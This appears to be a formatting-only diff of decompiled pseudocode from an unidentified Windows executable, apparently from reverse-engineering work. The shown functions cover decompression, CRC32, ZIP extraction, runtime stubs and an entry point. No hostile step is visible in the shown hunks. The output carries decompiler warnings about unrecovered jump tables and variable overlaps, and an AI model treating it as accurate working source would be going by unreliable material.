-FUN_00403cc8(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4,int param_5)
-
-{
+FUN_00403cc8(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4,int param_5) {
   undefined4 *puVar1;
   
   puVar1 = (undefined4 *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),1,0x1c);
@@ -3185,8 +3048,6 @@ FUN_00403cc8(undefined param_1,undefined param_2,undefined4 param_3,undefined4 p
   }
   return;
 }
-
-
 
 void __cdecl FUN_00403cfc(uint param_1,byte **param_2,int param_3)
 
@@ -3537,20 +3398,12 @@ LAB_004041c7:
   goto LAB_00404278;
 }
 
-
-
-void __cdecl FUN_004042af(undefined4 param_1,int param_2)
-
-{
+void __cdecl FUN_004042af(undefined4 param_1,int param_2) {
   (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
   return;
 }
 
-
-
-void __cdecl FUN_004042c0(int *param_1,int param_2,int *param_3)
-
-{
+void __cdecl FUN_004042c0(int *param_1,int param_2,int *param_3) {
   int iVar1;
   
   if (param_3 != (int *)0x0) {
@@ -3575,11 +3428,7 @@ void __cdecl FUN_004042c0(int *param_1,int param_2,int *param_3)
   return;
 }
 
-
-
-int * __cdecl FUN_0040432b(int param_1,int param_2,int param_3)
-
-{
+int * __cdecl FUN_0040432b(int param_1,int param_2,int param_3) {
   int *piVar1;
   int iVar2;
   
@@ -3607,11 +3456,7 @@ int * __cdecl FUN_0040432b(int param_1,int param_2,int param_3)
   return (int *)0x0;
 }
 
-
-
-void __cdecl FUN_004043b6(uint *param_1,byte **param_2,byte *param_3)
-
-{
+void __cdecl FUN_004043b6(uint *param_1,byte **param_2,byte *param_3) {
   uint *puVar1;
   byte bVar2;
   void *pvVar3;
@@ -4050,11 +3895,7 @@ LAB_004049e5:
   return;
 }
 
-
-
-undefined4 __cdecl FUN_00404be5(int *param_1,int param_2)
-
-{
+undefined4 __cdecl FUN_00404be5(int *param_1,int param_2) {
   FUN_004042c0(param_1,param_2,(int *)0x0);
   (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[10]);
   (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[9]);
@@ -4062,15 +3903,11 @@ undefined4 __cdecl FUN_00404be5(int *param_1,int param_2)
   return 0;
 }
 
-
-
 // WARNING: Could not reconcile some variable overlaps
 
 undefined4 __cdecl
 FUN_00404c19(int *param_1,uint param_2,uint param_3,int param_4,int param_5,int *param_6,
-            uint *param_7,int param_8,uint *param_9,uint *param_10)
-
-{
+            uint *param_7,int param_8,uint *param_9,uint *param_10) {
   uint *puVar1;
   int iVar2;
   uint uVar3;
@@ -4316,11 +4153,7 @@ FUN_00404c19(int *param_1,uint param_2,uint param_3,int param_4,int param_5,int 
   return 0;
 }
 
-
-
-int __cdecl FUN_00404fa0(int *param_1,uint *param_2,int *param_3,int param_4,int param_5)
-
-{
+int __cdecl FUN_00404fa0(int *param_1,uint *param_2,int *param_3,int param_4,int param_5) {
   uint *puVar1;
   int iVar2;
   uint local_8;
@@ -4346,13 +4179,9 @@ int __cdecl FUN_00404fa0(int *param_1,uint *param_2,int *param_3,int param_4,int
   return iVar2;
 }
 
-
-
 int __cdecl
 FUN_0040501f(uint param_1,uint param_2,int *param_3,uint *param_4,uint *param_5,int *param_6,
-            int *param_7,int param_8,int param_9)
-
-{
+            int *param_7,int param_8,int param_9) {
   uint *puVar1;
   int iVar2;
   uint local_8;
@@ -4403,12 +4232,8 @@ LAB_00405110:
   return iVar2;
 }
 
-
-
 undefined4 __cdecl
-FUN_00405122(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4)
-
-{
+FUN_00405122(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4) {
   *param_1 = 9;
   *param_2 = 5;
   *param_3 = 0x40bcf0;
@@ -4416,12 +4241,8 @@ FUN_00405122(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3,undefin
   return 0;
 }
 
-
-
 undefined4 __cdecl
-FUN_0040514d(uint param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)
-
-{
+FUN_0040514d(uint param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6) {
   byte bVar1;
   uint uVar2;
   uint uVar3;
@@ -4611,11 +4432,7 @@ LAB_004053ed:
   goto LAB_004051d5;
 }
 
-
-
-uint __cdecl FUN_0040541f(uint param_1,byte *param_2,uint param_3)
-
-{
+uint __cdecl FUN_0040541f(uint param_1,byte *param_2,uint param_3) {
   uint uVar1;
   uint uVar2;
   
@@ -4647,11 +4464,7 @@ uint __cdecl FUN_0040541f(uint param_1,byte *param_2,uint param_3)
   return ~param_1;
 }
 
-
-
-void __cdecl FUN_00405535(uint *param_1,byte param_2)
-
-{
+void __cdecl FUN_00405535(uint *param_1,byte param_2) {
   uint uVar1;
   
   uVar1 = *(uint *)(&DAT_0040d054 + (*param_1 & 0xff ^ (uint)param_2) * 4) ^ *param_1 >> 8;
@@ -4662,22 +4475,14 @@ void __cdecl FUN_00405535(uint *param_1,byte param_2)
   return;
 }
 
-
-
-uint __cdecl FUN_00405588(int param_1)
-
-{
+uint __cdecl FUN_00405588(int param_1) {
   uint uVar1;
   
   uVar1 = *(uint *)(param_1 + 8) & 0xfffd | 2;
   return (uVar1 ^ 1) * uVar1 >> 8 & 0xff;
 }
 
-
-
-uint __cdecl FUN_004055a3(uint *param_1,byte param_2)
-
-{
+uint __cdecl FUN_004055a3(uint *param_1,byte param_2) {
   uint uVar1;
   
   uVar1 = FUN_00405588((int)param_1);
@@ -4686,11 +4491,7 @@ uint __cdecl FUN_004055a3(uint *param_1,byte param_2)
   return uVar1 & 0xffffff00 | (uint)param_2;
 }
 
-
-
-uint __cdecl FUN_004055c4(uint param_1,byte *param_2,uint param_3)
-
-{
+uint __cdecl FUN_004055c4(uint param_1,byte *param_2,uint param_3) {
   uint uVar1;
   uint uVar2;
   uint uVar3;
@@ -4764,11 +4565,7 @@ uint __cdecl FUN_004055c4(uint param_1,byte *param_2,uint param_3)
   return uVar3;
 }
 
-
-
-undefined4 __cdecl FUN_004056fa(int param_1)
-
-{
+undefined4 __cdecl FUN_004056fa(int param_1) {
   uint *puVar1;
   
   if ((param_1 != 0) && (puVar1 = *(uint **)(param_1 + 0x1c), puVar1 != (uint *)0x0)) {
@@ -4782,11 +4579,7 @@ undefined4 __cdecl FUN_004056fa(int param_1)
   return 0xfffffffe;
 }
 
-
-
-undefined4 __cdecl FUN_00405739(int param_1)
-
-{
+undefined4 __cdecl FUN_00405739(int param_1) {
   int *piVar1;
   
   if (((param_1 != 0) && (*(int *)(param_1 + 0x1c) != 0)) && (*(int *)(param_1 + 0x24) != 0)) {
@@ -4801,13 +4594,9 @@ undefined4 __cdecl FUN_00405739(int param_1)
   return 0xfffffffe;
 }
 
-
-
 // WARNING: Removing unreachable block (ram,0x00405836)
 
-undefined4 __cdecl FUN_00405777(int param_1)
-
-{
+undefined4 __cdecl FUN_00405777(int param_1) {
   int iVar1;
   int *piVar2;
   undefined4 uVar3;
@@ -4845,11 +4634,7 @@ undefined4 __cdecl FUN_00405777(int param_1)
   return uVar3;
 }
 
-
-
-byte * __cdecl FUN_0040583c(byte **param_1,byte *param_2)
-
-{
+byte * __cdecl FUN_0040583c(byte **param_1,byte *param_2) {
   byte bVar1;
   undefined4 *puVar2;
   undefined4 uVar3;
@@ -5067,13 +4852,9 @@ switchD_00405880_caseD_5:
   return pbVar5;
 }
 
-
-
 // WARNING: Could not reconcile some variable overlaps
 
-undefined * __cdecl FUN_00405bae(LPCSTR param_1,undefined4 param_2,int param_3,undefined4 *param_4)
-
-{
+undefined * __cdecl FUN_00405bae(LPCSTR param_1,undefined4 param_2,int param_3,undefined4 *param_4) {
   ushort uVar1;
   DWORD DVar2;
   undefined *puVar3;
@@ -5130,11 +4911,7 @@ LAB_00405c36:
   return puVar3;
 }
 
-
-
-undefined4 __cdecl FUN_00405c9f(void *param_1)
-
-{
+undefined4 __cdecl FUN_00405c9f(void *param_1) {
   if (param_1 == (void *)0x0) {
     return 0xffffffff;
   }
@@ -5145,22 +4922,14 @@ undefined4 __cdecl FUN_00405c9f(void *param_1)
   return 0;
 }
 
-
-
-undefined4 __cdecl FUN_00405cc7(char *param_1)
-
-{
+undefined4 __cdecl FUN_00405cc7(char *param_1) {
   if ((*param_1 != '\0') && (param_1[8] != '\0')) {
     return 1;
   }
   return 0;
 }
 
-
-
-int __cdecl FUN_00405cdd(char *param_1)
-
-{
+int __cdecl FUN_00405cdd(char *param_1) {
   DWORD DVar1;
   
   if (*param_1 != '\0') {
@@ -5175,11 +4944,7 @@ int __cdecl FUN_00405cdd(char *param_1)
   return *(int *)(param_1 + 0x1c);
 }
 
-
-
-undefined4 __cdecl FUN_00405d0e(char *param_1,int param_2,int param_3)
-
-{
+undefined4 __cdecl FUN_00405d0e(char *param_1,int param_2,int param_3) {
   DWORD dwMoveMethod;
   
   if (*param_1 != '\0') {
@@ -5220,11 +4985,7 @@ undefined4 __cdecl FUN_00405d0e(char *param_1,int param_2,int param_3)
   return 0;
 }
 
-
-
-uint __cdecl FUN_00405d8a(void *param_1,uint param_2,int param_3,char *param_4)
-
-{
+uint __cdecl FUN_00405d8a(void *param_1,uint param_2,int param_3,char *param_4) {
   int iVar1;
   BOOL BVar2;
   void *_Size;
@@ -5249,11 +5010,7 @@ uint __cdecl FUN_00405d8a(void *param_1,uint param_2,int param_3,char *param_4)
   return (uint)param_1 / param_2;
 }
 
-
-
-int __cdecl FUN_00405def(char *param_1,uint *param_2)
-
-{
+int __cdecl FUN_00405def(char *param_1,uint *param_2) {
   uint uVar1;
   int iVar2;
   byte local_5;
@@ -5267,11 +5024,7 @@ int __cdecl FUN_00405def(char *param_1,uint *param_2)
   return -(uint)(iVar2 != 0);
 }
 
-
-
-void __cdecl FUN_00405e27(char *param_1,int *param_2)
-
-{
+void __cdecl FUN_00405e27(char *param_1,int *param_2) {
   uint uVar1;
   int iVar2;
   uint local_8;
@@ -5286,11 +5039,7 @@ void __cdecl FUN_00405e27(char *param_1,int *param_2)
   return;
 }
 
-
-
-void __cdecl FUN_00405e6b(char *param_1,char **param_2)
-
-{
+void __cdecl FUN_00405e6b(char *param_1,char **param_2) {
   char *pcVar1;
   char *pcVar2;
   int iVar3;
@@ -5316,11 +5065,7 @@ void __cdecl FUN_00405e6b(char *param_1,char **param_2)
   return;
 }
 
-
-
-int __cdecl FUN_00405edf(char *param_1)
-
-{
+int __cdecl FUN_00405edf(char *param_1) {
   int iVar1;
   uint uVar2;
   void *_Memory;
@@ -5378,11 +5123,7 @@ LAB_00405fc0:
   return -1;
 }
 
-
-
-char ** __cdecl unzip_something(char *param_1)
-
-{
+char ** __cdecl unzip_something(char *param_1) {
   int iVar1;
   char **ppcVar2;
   char **ppcVar3;
@@ -5474,11 +5215,7 @@ LAB_00406112:
   return (char **)0x0;
 }
 
-
-
-undefined4 __cdecl FUN_00406162(void **param_1)
-
-{
+undefined4 __cdecl FUN_00406162(void **param_1) {
   if (param_1 == (void **)0x0) {
     return 0xffffff9a;
   }
@@ -5490,11 +5227,7 @@ undefined4 __cdecl FUN_00406162(void **param_1)
   return 0;
 }
 
-
-
-void __cdecl FUN_00406191(uint param_1,int *param_2)
-
-{
+void __cdecl FUN_00406191(uint param_1,int *param_2) {
   param_2[3] = param_1 >> 0x10 & 0x1f;
   param_2[5] = (param_1 >> 0x19) + 0x7bc;
   param_2[2] = param_1 >> 0xb & 0x1f;
@@ -5504,13 +5237,9 @@ void __cdecl FUN_00406191(uint param_1,int *param_2)
   return;
 }
 
-
-
 int __cdecl
 FUN_004061e0(char **param_1,int *param_2,char **param_3,void *param_4,uint param_5,void *param_6,
-            uint param_7,void *param_8,uint param_9)
-
-{
+            uint param_7,void *param_8,uint param_9) {
   char **ppcVar1;
   int iVar2;
   uint uVar3;
@@ -5692,22 +5421,14 @@ LAB_00406438:
   return local_8;
 }
 
-
-
 void __cdecl
 FUN_004064bb(char **param_1,int *param_2,void *param_3,uint param_4,void *param_5,uint param_6,
-            void *param_7,uint param_8)
-
-{
+            void *param_7,uint param_8) {
   FUN_004061e0(param_1,param_2,(char **)0x0,param_3,param_4,param_5,param_6,param_7,param_8);
   return;
 }
 
-
-
-int __cdecl FUN_004064e2(char **param_1)
-
-{
+int __cdecl FUN_004064e2(char **param_1) {
   int iVar1;
   
   if (param_1 == (char **)0x0) {
@@ -5723,11 +5444,7 @@ int __cdecl FUN_004064e2(char **param_1)
   return iVar1;
 }
 
-
-
-int __cdecl FUN_00406520(char **param_1)
-
-{
+int __cdecl FUN_00406520(char **param_1) {
   int iVar1;
   
   if (param_1 == (char **)0x0) {
@@ -5749,11 +5466,7 @@ int __cdecl FUN_00406520(char **param_1)
   return iVar1;
 }
 
-
-
-int __cdecl FUN_0040657a(char **param_1,char **param_2,char **param_3,int *param_4)
-
-{
+int __cdecl FUN_0040657a(char **param_1,char **param_2,char **param_3,int *param_4) {
   char **ppcVar1;
   char **ppcVar2;
   char **ppcVar3;
@@ -5854,11 +5567,7 @@ int __cdecl FUN_0040657a(char **param_1,char **param_2,char **param_3,int *param
   return iVar5;
 }
 
-
-
-undefined4 __cdecl FUN_0040671d(char **param_1,byte *param_2)
-
-{
+undefined4 __cdecl FUN_0040671d(char **param_1,byte *param_2) {
   char *pcVar1;
   char **ppcVar2;
   undefined uVar3;
@@ -5944,11 +5653,7 @@ undefined4 __cdecl FUN_0040671d(char **param_1,byte *param_2)
   return uVar6;
 }
 
-
-
-byte * __cdecl FUN_00406880(void *param_1,void *param_2,void *param_3,undefined *param_4)
-
-{
+byte * __cdecl FUN_00406880(void *param_1,void *param_2,void *param_3,undefined *param_4) {
   void **ppvVar1;
   char cVar2;
   void **ppvVar3;
@@ -6089,11 +5794,7 @@ LAB_00406a75:
   return local_8;
 }
 
-
-
-undefined4 __cdecl FUN_00406a97(int param_1)
-
-{
+undefined4 __cdecl FUN_00406a97(int param_1) {
   void **_Memory;
   undefined4 local_4;
   
@@ -6120,11 +5821,7 @@ undefined4 __cdecl FUN_00406a97(int param_1)
   return local_4;
 }
 
-
-
-ulonglong __cdecl FUN_00406b02(uint param_1)
-
-{
+ulonglong __cdecl FUN_00406b02(uint param_1) {
   ulonglong uVar1;
   
   uVar1 = __allmul(param_1 + 0xb6109100,((int)param_1 >> 0x1f) + 2 + (uint)(0x49ef6eff < param_1),
@@ -6132,11 +5829,7 @@ ulonglong __cdecl FUN_00406b02(uint param_1)
   return uVar1;
 }
 
-
-
-_FILETIME __cdecl FUN_00406b23(uint param_1,uint param_2)
-
-{
+_FILETIME __cdecl FUN_00406b23(uint param_1,uint param_2) {
   SYSTEMTIME local_1c;
   _FILETIME local_c;
   
@@ -6151,11 +5844,7 @@ _FILETIME __cdecl FUN_00406b23(uint param_1,uint param_2)
   return local_c;
 }
 
-
-
-char ** __thiscall FUN_00406b8e(void *this,LPCSTR param_1,undefined4 param_2,int param_3)
-
-{
+char ** __thiscall FUN_00406b8e(void *this,LPCSTR param_1,undefined4 param_2,int param_3) {
   char cVar1;
   size_t sVar2;
   DWORD DVar3;
@@ -6190,11 +5879,7 @@ char ** __thiscall FUN_00406b8e(void *this,LPCSTR param_1,undefined4 param_2,int
   return local_8;
 }
 
-
-
-undefined4 __thiscall FUN_00406c40(void *this,char *param_1,undefined4 *param_2)
-
-{
+undefined4 __thiscall FUN_00406c40(void *this,char *param_1,undefined4 *param_2) {
   undefined *puVar1;
   uchar uVar2;
   void *pvVar3;
@@ -6387,11 +6072,7 @@ undefined4 __thiscall FUN_00406c40(void *this,char *param_1,undefined4 *param_2)
   return 0;
 }
 
-
-
-void __cdecl FUN_00407070(LPCSTR param_1,char *param_2)
-
-{
+void __cdecl FUN_00407070(LPCSTR param_1,char *param_2) {
   char cVar1;
   DWORD DVar2;
   char *pcVar3;
@@ -6431,11 +6112,7 @@ void __cdecl FUN_00407070(LPCSTR param_1,char *param_2)
   return;
 }
 
-
-
-int __thiscall FUN_00407136(void *this,char *param_1,char *param_2,void *param_3,int param_4)
-
-{
+int __thiscall FUN_00407136(void *this,char *param_1,char *param_2,void *param_3,int param_4) {
   char **ppcVar1;
   char cVar2;
   char *pcVar3;
@@ -6589,11 +6266,7 @@ LAB_0040745a:
   return (int)param_3;
 }
 
-
-
-undefined4 __fastcall FUN_0040747b(void **param_1)
-
-{
+undefined4 __fastcall FUN_0040747b(void **param_1) {
   if (param_1[1] != (void *)0xffffffff) {
     FUN_00406a97((int)*param_1);
   }
@@ -6605,11 +6278,7 @@ undefined4 __fastcall FUN_0040747b(void **param_1)
   return 0;
 }
 
-
-
-undefined4 * FUN_004074a4(void)
-
-{
+undefined4 * FUN_004074a4(void) {
   void *this;
   undefined4 *this_00;
   undefined4 *puVar1;
@@ -6645,11 +6314,7 @@ undefined4 * FUN_004074a4(void)
   return puVar1;
 }
 
-
-
-undefined4 * __thiscall FUN_00407527(void *this,char *param_1)
-
-{
+undefined4 * __thiscall FUN_00407527(void *this,char *param_1) {
   size_t sVar1;
   char *_Dest;
   
@@ -6667,11 +6332,7 @@ undefined4 * __thiscall FUN_00407527(void *this,char *param_1)
   return (undefined4 *)this;
 }
 
-
-
-void __fastcall FUN_00407572(int param_1)
-
-{
+void __fastcall FUN_00407572(int param_1) {
   if (*(void **)(param_1 + 0x138) != (void *)0x0) {
     operator_delete(*(void **)(param_1 + 0x138));
   }
@@ -6683,20 +6344,12 @@ void __fastcall FUN_00407572(int param_1)
   return;
 }
 
-
-
-void FUN_004075ad(undefined4 param_1,undefined4 param_2,undefined4 param_3)
-
-{
+void FUN_004075ad(undefined4 param_1,undefined4 param_2,undefined4 param_3) {
   FUN_004074a4();
   return;
 }
 
-
-
-void __cdecl FUN_004075c4(int *param_1,char *param_2,undefined4 *param_3)
-
-{
+void __cdecl FUN_004075c4(int *param_1,char *param_2,undefined4 *param_3) {
   *param_3 = 0;
   *(undefined *)(param_3 + 1) = 0;
   param_3[0x4a] = 0;
@@ -6714,11 +6367,7 @@ void __cdecl FUN_004075c4(int *param_1,char *param_2,undefined4 *param_3)
   return;
 }
 
-
-
-void __cdecl FUN_00407603(int *param_1,char *param_2,char *param_3,void *param_4,int param_5)
-
-{
+void __cdecl FUN_00407603(int *param_1,char *param_2,char *param_3,void *param_4,int param_5) {
   if (param_1 == (int *)0x0) {
     DAT_0040f938 = 0x10000;
   }
@@ -6733,20 +6382,12 @@ void __cdecl FUN_00407603(int *param_1,char *param_2,char *param_3,void *param_4
   return;
 }
 
-
-
-void __cdecl FUN_0040763d(int *param_1,char *param_2,char *param_3)
-
-{
+void __cdecl FUN_0040763d(int *param_1,char *param_2,char *param_3) {
   FUN_00407603(param_1,param_2,param_3,(void *)0x0,2);
   return;
 }
 
-
-
-undefined4 __cdecl FUN_00407656(int *param_1)
-
-{
+undefined4 __cdecl FUN_00407656(int *param_1) {
   void **ppvVar1;
   
   if (param_1 == (int *)0x0) {
@@ -6768,13 +6409,9 @@ undefined4 __cdecl FUN_00407656(int *param_1)
   return DAT_0040f938;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-char * __cdecl strcpy(char *_Dest,char *_Source)
-
-{
+char * __cdecl strcpy(char *_Dest,char *_Source) {
   char *pcVar1;
   
                     // WARNING: Could not recover jumptable at 0x004076a8. Too many branches
@@ -6783,13 +6420,9 @@ char * __cdecl strcpy(char *_Dest,char *_Source)
   return pcVar1;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-void * __cdecl memset(void *_Dst,int _Val,size_t _Size)
-
-{
+void * __cdecl memset(void *_Dst,int _Val,size_t _Size) {
   void *pvVar1;
   
                     // WARNING: Could not recover jumptable at 0x004076ae. Too many branches
@@ -6798,13 +6431,9 @@ void * __cdecl memset(void *_Dst,int _Val,size_t _Size)
   return pvVar1;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-size_t __cdecl strlen(char *_Str)
-
-{
+size_t __cdecl strlen(char *_Str) {
   size_t sVar1;
   
                     // WARNING: Could not recover jumptable at 0x004076b4. Too many branches
@@ -6813,11 +6442,7 @@ size_t __cdecl strlen(char *_Str)
   return sVar1;
 }
 
-
-
-void FUN_004076c8(void)
-
-{
+void FUN_004076c8(void) {
   undefined4 in_FS_OFFSET;
   undefined auStack12 [12];
   
@@ -6825,26 +6450,18 @@ void FUN_004076c8(void)
   return;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-void __cdecl operator_delete(void *param_1)
-
-{
+void __cdecl operator_delete(void *param_1) {
                     // WARNING: Could not recover jumptable at 0x004076e8. Too many branches
                     // WARNING: Treating indirect jump as call
   operator_delete();
   return;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-int __cdecl memcmp(void *_Buf1,void *_Buf2,size_t _Size)
-
-{
+int __cdecl memcmp(void *_Buf1,void *_Buf2,size_t _Size) {
   int iVar1;
   
                     // WARNING: Could not recover jumptable at 0x004076ee. Too many branches
@@ -6853,24 +6470,16 @@ int __cdecl memcmp(void *_Buf1,void *_Buf2,size_t _Size)
   return iVar1;
 }
 
-
-
-void _local_unwind2(void)
-
-{
+void _local_unwind2(void) {
                     // WARNING: Could not recover jumptable at 0x004076fa. Too many branches
                     // WARNING: Treating indirect jump as call
   _local_unwind2();
   return;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-void * __cdecl operator_new(uint param_1)
-
-{
+void * __cdecl operator_new(uint param_1) {
   void *pvVar1;
   
                     // WARNING: Could not recover jumptable at 0x00407700. Too many branches
@@ -6879,13 +6488,9 @@ void * __cdecl operator_new(uint param_1)
   return pvVar1;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)
-
-{
+void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size) {
   void *pvVar1;
   
                     // WARNING: Could not recover jumptable at 0x00407706. Too many branches
@@ -6894,13 +6499,9 @@ void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)
   return pvVar1;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-int __cdecl strcmp(char *_Str1,char *_Str2)
-
-{
+int __cdecl strcmp(char *_Str1,char *_Str2) {
   int iVar1;
   
                     // WARNING: Could not recover jumptable at 0x00407740. Too many branches
@@ -6909,28 +6510,20 @@ int __cdecl strcmp(char *_Str1,char *_Str2)
   return iVar1;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-void _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)
-
-{
+void _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo) {
                     // WARNING: Could not recover jumptable at 0x0040776e. Too many branches
                     // WARNING: Treating indirect jump as call
   _CxxThrowException();
   return;
 }
 
-
-
 // Library Function - Single Match
 // Name: __allmul
 // Library: Visual Studio
 
-ulonglong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)
-
-{
+ulonglong __allmul(uint param_1,uint param_2,uint param_3,uint param_4) {
   if ((param_4 | param_2) == 0) {
     return (ulonglong)param_1 * (ulonglong)param_3;
   }
@@ -6940,13 +6533,9 @@ ulonglong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)
          param_2 * param_3 + param_1 * param_4) << 0x20;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-char * __cdecl strcat(char *_Dest,char *_Source)
-
-{
+char * __cdecl strcat(char *_Dest,char *_Source) {
   char *pcVar1;
   
                     // WARNING: Could not recover jumptable at 0x004077b4. Too many branches
@@ -6955,13 +6544,9 @@ char * __cdecl strcat(char *_Dest,char *_Source)
   return pcVar1;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-void entry(void)
-
-{
+void entry(void) {
   undefined4 *puVar1;
   uint nCmdShow;
   HMODULE hInstance;
@@ -7036,54 +6621,34 @@ LAB_004078ad:
   exit(local_6c);
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-void __thiscall _type_info(type_info *this)
-
-{
+void __thiscall _type_info(type_info *this) {
                     // WARNING: Could not recover jumptable at 0x00407918. Too many branches
                     // WARNING: Treating indirect jump as call
   _type_info();
   return;
 }
 
-
-
-void _initterm(void)
-
-{
+void _initterm(void) {
                     // WARNING: Could not recover jumptable at 0x00407924. Too many branches
                     // WARNING: Treating indirect jump as call
   _initterm();
   return;
 }
 
-
-
-void FUN_0040792a(void)
-
-{
+void FUN_0040792a(void) {
   _controlfp(0x10000,0x30000);
   return;
 }
 
-
-
-void FUN_0040793f(void)
-
-{
+void FUN_0040793f(void) {
   return;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-uint __cdecl _controlfp(uint _NewValue,uint _Mask)
-
-{
+uint __cdecl _controlfp(uint _NewValue,uint _Mask) {
   uint uVar1;
   
                     // WARNING: Could not recover jumptable at 0x00407940. Too many branches
@@ -7092,70 +6657,44 @@ uint __cdecl _controlfp(uint _NewValue,uint _Mask)
   return uVar1;
 }
 
-
-
-void Unwind_00407950(void)
-
-{
+void Unwind_00407950(void) {
   int unaff_EBP;
   
   FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
   return;
 }
 
-
-
-void Unwind_0040795b(void)
-
-{
+void Unwind_0040795b(void) {
   int unaff_EBP;
   
   FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
   return;
 }
 
-
-
-void Unwind_00407970(void)
-
-{
+void Unwind_00407970(void) {
   int unaff_EBP;
   
   FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
   return;
 }
 
-
-
-void Unwind_0040797b(void)
-
-{
+void Unwind_0040797b(void) {
   int unaff_EBP;
   
   FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
   return;
 }
 
-
-
-void Unwind_00407986(void)
-
-{
+void Unwind_00407986(void) {
   int unaff_EBP;
   
   FUN_00402a6f((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x54));
   return;
 }
 
-
-
-void Unwind_0040799c(void)
-
-{
+void Unwind_0040799c(void) {
   int unaff_EBP;
   
   operator_delete(*(void **)(unaff_EBP + -0x10));
   return;
 }
-
-
